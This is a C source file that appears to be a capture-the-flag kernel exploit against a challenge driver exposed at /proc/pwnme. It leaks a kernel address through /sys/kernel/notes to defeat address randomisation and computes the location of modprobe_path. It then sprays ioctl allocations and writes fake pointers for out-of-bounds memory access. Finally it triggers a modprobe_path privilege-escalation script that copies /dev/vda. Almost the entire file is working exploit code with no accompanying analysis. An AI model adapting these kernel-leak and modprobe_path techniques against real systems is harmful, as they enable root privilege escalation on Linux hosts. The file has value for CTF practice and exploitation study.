#include <fcntl.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define IOCTL_CREATE 0x40087000
#define IOCTL_SWITCH 0x40087001

#define MODPROBE_LEAK_OFFSET 0x3bb840ll

uint64_t modprobe_path_address = 0;

/*
 * ffffffffadc00000 T startup_64
 * ffffffffb00471c0 T startup_xen
 * ffffffffafc8b980 D modprobe_path
 */

struct fatptr {
    void *data;
    size_t size;
};

// taken from https://github.com/google/google-ctf/blob/master/2023/pwn-kconcat/solution/exp.c
void hexdump(char* buf, int size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0)
            printf("%04x: ", i);
        printf("%02x ", buf[i]);
        if (i % 16 == 15)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

void get_flag(void){
    puts("[+] Triggering modprobe shit");
    system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    system("cat /tmp/flag");
}

int main(void)
{
    int fd, ret;
    ssize_t n;
    uint64_t leak = 0;
    char raw_leak[8] = {0};


    fd = open("/sys/kernel/notes", O_RDONLY);
    assert(fd >= 0);

    pread(fd, raw_leak, sizeof(leak), 0x84);
    for (int i = 0; i < 8; i++) {
        leak += (uint8_t)raw_leak[i] << (i*8);
    }

    leak += 1;

    close(fd);

    printf("[+] Kernel leak: %lx\n", leak);
    modprobe_path_address = leak - MODPROBE_LEAK_OFFSET;
    printf("[+] modprobe_path: %lx\n", modprobe_path_address);

    fd = open("/proc/pwnme", O_RDWR);
    assert(fd != -1);

    // we try to overlap the oob index and a real chunk allocated with
    // IOCTL_CREATE
    size_t size = 0x100;
    for (int i = 0; i < 0x10; i++) {
        ret = ioctl(fd, IOCTL_CREATE, &size);
        assert(ret >= 0);
    }

    // overlapping index changes so we write the fake in all
    for (int i = 0; i < 0x10; i++) {
        ret = ioctl(fd, IOCTL_SWITCH, &i);
        assert(ret >= 0);

        struct fatptr fake_ptr = {
                (void *) 0xfffffe0000000000,
                0xffffffffffffffff,
        };

        // this is a legit write
        assert(write(fd, &fake_ptr, sizeof(struct fatptr)) >= 0);
    }

    long index = 0x10;
    ret = ioctl(fd, IOCTL_SWITCH, &index);
    assert(ret >= 0);

    char r[0x1000];
    n = read(fd, r, sizeof(r));
    hexdump(r, sizeof(r));

    //n = write(fd, "/tmp/x", 8);
    // assert(n >= 0);

    get_flag();
    close(fd);

    return 0;
}